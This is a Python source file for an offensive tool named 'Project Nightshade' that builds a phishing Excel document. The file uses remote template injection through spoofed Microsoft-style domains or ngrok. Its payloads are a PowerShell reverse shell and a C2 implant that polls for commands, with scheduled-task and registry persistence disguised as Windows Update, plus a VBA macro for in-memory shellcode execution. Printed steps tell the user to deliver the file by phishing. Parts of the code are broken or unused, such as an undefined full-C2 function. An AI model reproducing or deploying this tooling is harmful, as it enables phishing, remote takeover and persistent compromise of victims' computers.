#!/usr/bin/env python3
"""
Project Nightshade - Advanced Excel Dropper with Enhanced C2 Integration
Author: ek0ms savi0r | OPSEC Grade: Midnight
Description:
    Creates an Excel file with OLE template injection that deploys multiple payload options:
    - Reverse Shell (Connects to Nightshade C2)
    - RCE + Persistence (Uses Nightshade C2 endpoints)
    - Full C2 Agent (Advanced C2 with Nightshade protocol)
    Interactive version with payload selection menu.
"""
import os
import sys
import shutil
import zipfile
import tempfile
import random
import string
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests

def prompt_user():
    """Interactive prompt for user configuration"""
    print('''
    ╔══════════════════════════════════════════════════════════╗
    ║                   PROJECT NIGHTSHADE                     ║
    ║                 Advanced Excel Dropper                   ║
    ║                   by : ek0ms savi0r                      ║
    ╚══════════════════════════════════════════════════════════╝
    ''')
    
    print("[!] FOR AUTHORIZED SECURITY RESEARCH ONLY")
    print("[!] This tool creates malicious documents for penetration testing")
    print("\n" + "="*60)
    
    output_file = input("\n[?] Output filename [Financial_Report_Q3.xlsx]: ").strip()
    if not output_file:
        output_file = 'Financial_Report_Q3.xlsx'
    
    print("\n[?] Select payload type:")
    print("    1. Reverse Shell (Connects to Nightshade C2)")
    print("    2. RCE + Persistence (Uses Nightshade C2 endpoints)") 
    print("    3. Full C2 Agent (Advanced Nightshade protocol)")
    
    payload_choice = input("[?] Enter choice [2]: ").strip()
    if not payload_choice:
        payload_choice = '2'
    
    payload_type = ""
    additional_config = {}
    
    if payload_choice == '1':
        payload_type = "reverse_shell"
        print("\n[+] Selected: Reverse Shell (Nightshade C2)")
        print("[?] Nightshade C2 Server Configuration:")
        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
        c2_port = input("[?] C2 Reverse Shell Port [4444]: ").strip() or "4444"
        additional_config['lhost'] = c2_host
        additional_config['lport'] = c2_port
        
    elif payload_choice == '2':
        payload_type = "rce_persistence"
        print("\n[+] Selected: RCE + Persistence (Nightshade C2)")
        print("[?] Nightshade C2 Server Configuration:")
        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
        c2_port = input("[?] C2 HTTP Port [8080]: ").strip() or "8080"
        additional_config['c2_server'] = f"http://{c2_host}:{c2_port}"
        
    elif payload_choice == '3':
        payload_type = "full_c2"
        print("\n[+] Selected: Full C2 Agent (Nightshade)")
        print("[?] Nightshade C2 Server Configuration:")
        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
        c2_port = input("[?] C2 HTTP Port [8080]: ").strip() or "8080"
        additional_config['c2_server'] = f"http://{c2_host}:{c2_port}"
    
    encryption_key = input("[?] Encryption key [nightshade-midnight-love-2023]: ").strip()
    if not encryption_key:
        encryption_key = 'nightshade-midnight-love-2023'
    
    print("\n[?] Choose delivery method:")
    print("    1. Ngrok tunneling (recommended for quick operations)")
    print("    2. Domain rotation (for persistent campaigns)")
    print("    3. Custom domain")
    
    delivery_choice = input("[?] Enter choice [1]: ").strip()
    if not delivery_choice:
        delivery_choice = '1'
    
    custom_domain = None
    use_ngrok = True
    
    if delivery_choice == '1':
        use_ngrok = True
        print("[+] Selected: Ngrok tunneling")
    elif delivery_choice == '2':
        use_ngrok = False
        print("[+] Selected: Domain rotation")
    elif delivery_choice == '3':
        use_ngrok = False
        custom_domain = input("[?] Enter custom domain: ").strip()
        if not custom_domain:
            print("[-] No domain provided, using domain rotation")
        else:
            print(f"[+] Selected: Custom domain ({custom_domain})")
    else:
        print("[-] Invalid choice, using ngrok tunneling")
        use_ngrok = True
    
    print("\n" + "="*60)
    print("[+] Configuration Summary:")
    print(f"    Output file: {output_file}")
    print(f"    Payload type: {payload_type}")
    print(f"    Encryption key: {encryption_key}")
    print(f"    Delivery method: {'Ngrok' if use_ngrok else 'Domain rotation'}")
    
    for key, value in additional_config.items():
        print(f"    {key.upper()}: {value}")
    
    confirm = input("\n[?] Proceed with these settings? (y/N): ").strip().lower()
    if confirm not in ['y', 'yes']:
        print("[-] Operation cancelled")
        sys.exit(0)
    
    return {
        'output_file': output_file,
        'payload_type': payload_type,
        'encryption_key': encryption_key,
        'use_ngrok': use_ngrok,
        'custom_domain': custom_domain,
        **additional_config
    }

CONFIG = {}
STAGING_DOMAINS = [
    'cdn.microsoft-update.com',
    'assets-windows.net',
    'secure-download.office365.com',
    'template-store.azurewebsites.net'
]

def get_ngrok_tunnel_url():
    """Get the current ngrok tunnel URL from the staging server"""
    try:
        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
        tunnels = response.json()['tunnels']
        for tunnel in tunnels:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def get_current_domain():
    """Rotate through available domains for OPSEC"""
    current_time = int(time.time())
    domain_index = current_time % len(STAGING_DOMAINS)
    return STAGING_DOMAINS[domain_index]

def create_remote_template_injection():
    """Create the external link that points to our staging server using domain rotation"""
    current_domain = get_current_domain()
    
    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="https://{current_domain}/template.ole" r:id="rId1"/>
</externalLink>'''
    
    return external_link

def create_custom_domain_injection(domain):
    """Create external link using custom domain"""
    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="https://{domain}/template.ole" r:id="rId1"/>
</externalLink>'''
    
    return external_link

def create_ngrok_template_injection():
    """Create external link pointing to ngrok tunnel"""
    ngrok_url = get_ngrok_tunnel_url()
    
    if not ngrok_url:
        print("[!] Ngrok tunnel not available, falling back to domain rotation")
        return create_remote_template_injection()
    
    external_link = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="{ngrok_url}/template.ole" r:id="rId1"/>
</externalLink>'''
    
    return external_link

def generate_random_name(length=8):
    """Generate random filename/identifier"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def encrypt_payload(payload, key):
    """AES encrypt the payload"""
    cipher = AES.new(pad(key.encode(), AES.block_size), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def create_reverse_shell_payload(lhost, lport):
    """Create PowerShell reverse shell payload that connects to Nightshade C2"""
    rev_shell = f'''
# Reverse Shell to Nightshade C2
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}

# Send beacon to identify as Nightshade implant
$beacon = [System.Text.Encoding]::ASCII.GetBytes("NIGHTSHADE_IMPLANT_CONNECTED`n")
$stream.Write($beacon, 0, $beacon.Length)
$stream.Flush()

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    
    # Handle special C2 commands
    if ($data.Trim() -eq "NIGHTSHADE_GET_SESSION") {{
        $sessionInfo = "SESSION:$env:COMPUTERNAME:$env:USERNAME"
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sessionInfo)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
        continue
    }}
    
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "NIGHTSHADE> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''

    persistent_rev_shell = f'''
# Persistence mechanism
function Setup-Persistence {{
    $persistencePath = "$env:APPDATA\\WindowsUpdate\\update.ps1"
    if (-not (Test-Path (Split-Path $persistencePath))) {{
        New-Item -ItemType Directory -Path (Split-Path $persistencePath) -Force
    }}
    Set-Content -Path $persistencePath -Value @'
{rev_shell}
'@
    
    # Scheduled task for persistence
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
}}

# Start reverse shell and setup persistence
try {{
    Setup-Persistence
    {rev_shell}
}} catch {{
    # Silent fail
}}
'''
    
    return persistent_rev_shell

def create_rce_persistence_payload(c2_server):
    """Create RCE with persistence payload using Nightshade C2 endpoints"""
    rce_payload = f'''
$key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
$iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')

function Encrypt-Data($data) {{
    try {{
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $key
        $aes.IV = $iv
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
        return [System.Convert]::ToBase64String($encrypted)
    }} catch {{
        return $null
    }}
}}

function Decrypt-Data($encryptedData) {{
    try {{
        $bytes = [System.Convert]::FromBase64String($encryptedData)
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $key
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    }} catch {{
        return "noop"
    }}
}}

function Establish-RCE {{
    $sessionId = [System.Guid]::NewGuid().ToString()
    
    while ($true) {{
        try {{
            # Check in with Nightshade C2 server
            $encryptedCheckin = Encrypt-Data "checkin_$([datetime]::Now.Ticks)"
            $response = Invoke-WebRequest -Uri "{c2_server}/c2/checkin" -Method POST -Headers @{{
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                "X-Session-ID" = $sessionId
            }} -Body $encryptedCheckin -UseBasicParsing
            
            $command = Decrypt-Data $response.Content
            if ($command -ne "noop") {{
                # Execute command and send back results
                try {{
                    $result = Invoke-Expression $command 2>&1 | Out-String
                    $status = "success"
                }} catch {{
                    $result = $_.Exception.Message
                    $status = "error"
                }}
                
                # Send results back to Nightshade C2
                $responseData = @{{
                    status = $status
                    result = $result
                    hostname = $env:COMPUTERNAME
                    username = $env:USERNAME
                }} | ConvertTo-Json -Compress
                
                $encryptedResult = Encrypt-Data $responseData
                Invoke-WebRequest -Uri "{c2_server}/c2/result" -Method POST -Headers @{{
                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    "X-Session-ID" = $sessionId
                }} -Body $encryptedResult -UseBasicParsing | Out-Null
            }}
        }} catch {{
            # Silent error handling
        }}
        Start-Sleep -Seconds 60
    }}
}}

function Setup-Persistence {{
    # Persistence via scheduled task
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$(Get-Content -Path '$PSCommandPath' | Select-Object -Skip 1 | Out-String)`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
    
    # Additional registry persistence
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$(Get-Content -Path '$PSCommandPath' | Select-Object -Skip 1 | Out-String)`""
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $regValue -Force
}}

# Main execution
Setup-Persistence
Establish-RCE
'''
    return rce_payload

def create_embedded_macro():
    """Create heavily obfuscated VBA macro"""
    vba_code = f'''
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, _
    ByVal sourceAddr As LongPtr, ByVal length As Long) As Long
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long

Sub Auto_Open()
    NightshadeInitialize
End Sub

Sub Workbook_Open()
    NightshadeInitialize
End Sub

Sub NightshadeInitialize()
    On Error Resume Next
    Dim payload As String
    Dim key As String
    Dim decodedData() As Byte
    Dim i As Long
    
    ' Extract encrypted payload from document metadata
    payload = ThisWorkbook.CustomDocumentProperties("AnalysisData")
    key = "{CONFIG['encryption_key']}"
    
    ' Decrypt and execute
    decodedData = Base64Decode(payload)
    decodedData = AESDecrypt(decodedData, key)
    
    If Len(decodedData) > 0 Then
        ExecuteInMemory decodedData
    End If
End Sub

Function Base64Decode(ByVal base64String As String) As Byte()
    ' Base64 decoding implementation
    Dim xmlObj As Object
    Dim nodeObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument")
    Set nodeObj = xmlObj.createElement("b64")
    nodeObj.DataType = "bin.base64"
    nodeObj.Text = base64String
    Base64Decode = nodeObj.nodeTypedValue
End Function

Function AESDecrypt(cipherText() As Byte, key As String) As Byte()
    ' AES decryption implementation
    Dim plainText() As Byte
    Dim aesObj As Object
    Dim decryptor As Object
    
    Set aesObj = CreateObject("System.Security.Cryptography.RijndaelManaged")
    aesObj.Key = CreateObject("System.Text.UTF8Encoding").GetBytes_4(key)
    aesObj.IV = Mid(cipherText, 1, 16)
    aesObj.Mode = 1 ' CBC
    aesObj.Padding = 2 ' PKCS7
    
    Set decryptor = aesObj.CreateDecryptor()
    plainText = decryptor.TransformFinalBlock(Mid(cipherText, 17), 0, UBound(Mid(cipherText, 17)) + 1)
    
    AESDecrypt = plainText
End Function

Sub ExecuteInMemory(payload() As Byte)
    ' In-memory execution via process hollowing or direct injection
    Dim mem As LongPtr
    Dim thread As LongPtr
    Dim i As Long
    
    mem = VirtualAlloc(0, UBound(payload) + 1, &H1000, &H40)
    For i = 0 To UBound(payload)
        RtlMoveMemory mem + i, VarPtr(payload(i)), 1
    Next i
    
    thread = CreateThread(0, 0, mem, 0, 0, 0)
    If thread <> 0 Then Sleep 10000
End Sub
'''
    return vba_code

def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_type="rce_persistence", payload_config=None):
    """Create Excel file with OLE template injection and embedded payload"""

    with tempfile.TemporaryDirectory() as tmpdir:
        excel_structure = {
            '[Content_Types].xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            '_rels/.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/workbook.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/_rels/workbook.xml.rels': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/worksheets/sheet1.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            'xl/vbaProject.bin': b'',  # Placeholder for compiled VBA
        }

        for filepath in excel_structure.keys():
            os.makedirs(os.path.join(tmpdir, os.path.dirname(filepath)), exist_ok=True)

        workbook_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <fileRecoveryPr autoRecover="1" crashSave="1" dataRecovery="1"/>
    <workbookPr/>
    <bookViews>
        <workbookView xWindow="240" yWindow="105" windowWidth="14805" windowHeight="8010"/>
    </bookViews>
    <sheets>
        <sheet name="Report" sheetId="1" r:id="rId1"/>
    </sheets>
    <externalReferences>
        <externalReference r:id="rId2"/>
    </externalReferences>
</workbook>'''

        with open(os.path.join(tmpdir, 'xl/workbook.xml'), 'w') as f:
            f.write(workbook_content)

        workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="../externalLinks/externalLink1.xml"/>
</Relationships>'''
        
        with open(os.path.join(tmpdir, 'xl/_rels/workbook.xml.rels'), 'w') as f:
            f.write(workbook_rels)

        # Choose injection method based on user selection
        template_source = ""
        template_url = ""
        
        if use_ngrok:
            external_link = create_ngrok_template_injection()
            template_source = "ngrok tunnel"
            template_url = get_ngrok_tunnel_url() or "Unknown (using fallback)"
        elif custom_domain:
            external_link = create_custom_domain_injection(custom_domain)
            template_source = "custom domain"
            template_url = f"https://{custom_domain}/template.ole"
        else:
            external_link = create_remote_template_injection()
            template_source = "domain rotation"
            template_url = f"https://{get_current_domain()}/template.ole"
        
        os.makedirs(os.path.join(tmpdir, 'xl/externalLinks'), exist_ok=True)
        with open(os.path.join(tmpdir, 'xl/externalLinks/externalLink1.xml'), 'w') as f:
            f.write(external_link)

        sheet_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        <row r="1">
            <c r="A1" t="inlineStr"><is><t>IMPORTANT FINANCIAL REPORT</t></is></c>
        </row>
        <row r="2">
            <c r="A2" t="inlineStr"><is><t>Please enable content to view full analysis</t></is></c>
        </row>
        <row r="3">
            <c r="A3" t="inlineStr"><is><t>Critical vulnerabilities detected: SYSTEM COMPROMISE POSSIBLE</t></is></c>
        </row>
    </sheetData>
</worksheet>'''
        
        with open(os.path.join(tmpdir, 'xl/worksheets/sheet1.xml'), 'w') as f:
            f.write(sheet_content)

        # Create the appropriate payload based on user selection
        if payload_type == "reverse_shell":
            ps_payload = create_reverse_shell_payload(payload_config['lhost'], payload_config['lport'])
        elif payload_type == "rce_persistence":
            ps_payload = create_rce_persistence_payload(payload_config['c2_server'])
        elif payload_type == "full_c2":
            ps_payload = create_full_c2_payload(payload_config['c2_server'])
        else:
            # Default to RCE if something goes wrong
            ps_payload = create_rce_persistence_payload(payload_config.get('c2_server', 'https://example.com/command'))
        
        encrypted_payload = encrypt_payload(ps_payload, CONFIG['encryption_key'])

        # Create the OLE template file that will be loaded
        ole_template = f'''<?xml version="1.0" encoding="UTF-8"?>
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Excel.Macro.1" Version="1.0">
        <Payload>{encrypted_payload}</Payload>
        <ActivationCondition>TRUE</ActivationCondition>
    </Object>
</Objects>'''

        # Create the final ZIP package (Excel file)
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, tmpdir)
                    zipf.write(file_path, arcname)
        
        print(f"\n[+] Created advanced Excel dropper: {output_file}")
        print(f"[+] Payload type: {payload_type}")
        print(f"[+] Encryption key: {CONFIG['encryption_key']}")
        
        if payload_type == "reverse_shell":
            print(f"[+] Reverse Shell Target: {payload_config['lhost']}:{payload_config['lport']}")
            print(f"[+] Connect to Nightshade C2 on port {payload_config['lport']}")
        else:
            print(f"[+] C2 Server: {payload_config['c2_server']}")
            print(f"[+] C2 Checkin: {payload_config['c2_server']}/c2/checkin")
            print(f"[+] C2 Results: {payload_config['c2_server']}/c2/result")
        
        print(f"[+] Template Source: {template_source}")
        print(f"[+] Template URL: {template_url}")

def main():
    """Main function with interactive prompts"""
    try:
        # Get user configuration
        user_config = prompt_user()
        
        # Update global config
        global CONFIG
        CONFIG = {
            'c2_server': user_config.get('c2_server', 'https://example.com/command'),
            'encryption_key': user_config['encryption_key'],
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'checkin_interval': '3600'
        }
        
        # Check ngrok status if enabled
        if user_config['use_ngrok']:
            ngrok_url = get_ngrok_tunnel_url()
            if ngrok_url:
                print(f"[+] Ngrok tunnel detected: {ngrok_url}")
            else:
                print("[!] Ngrok tunnel not found - falling back to domain rotation")
                user_config['use_ngrok'] = False
        
        # Create the malicious Excel file
        create_malicious_excel(
            user_config['output_file'],
            user_config['use_ngrok'],
            user_config['custom_domain'],
            user_config['payload_type'],
            user_config
        )
        
        print("\n[+] Delivery Instructions:")
        print("    1. Start the Nightshade C2 server first")
        print("    2. Deliver the Excel file via phishing campaign")
        print("    3. When opened, it loads the remote template")
        print("    4. Template executes encrypted in-memory payload")
        
        if user_config['payload_type'] == "reverse_shell":
            print("    5. Reverse shell connects to Nightshade C2")
            print(f"    6. C2 handles shell on port {user_config.get('lport', 4444)}")
        else:
            print("    5. Implant checks in to Nightshade C2 every 60 seconds")
            print("    6. Send commands via: POST /c2/command")
            print("    7. View results in C2 dashboard: /c2/sessions")
        
        if user_config['use_ngrok']:
            print("    8. Using ngrok tunneling for infrastructure-less deployment")
        elif user_config['custom_domain']:
            print(f"    8. Using custom domain: {user_config['custom_domain']}")
        else:
            print("    8. Using domain rotation for OPSEC")
            
        print("\n[!] Remember to start the Nightshade C2 server before deployment!")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[-] Ensure all dependencies are installed")
        print("[-] pip install pycryptodome requests")
    except KeyboardInterrupt:
        print("\n[-] Operation cancelled by user")

if __name__ == "__main__":
    main()
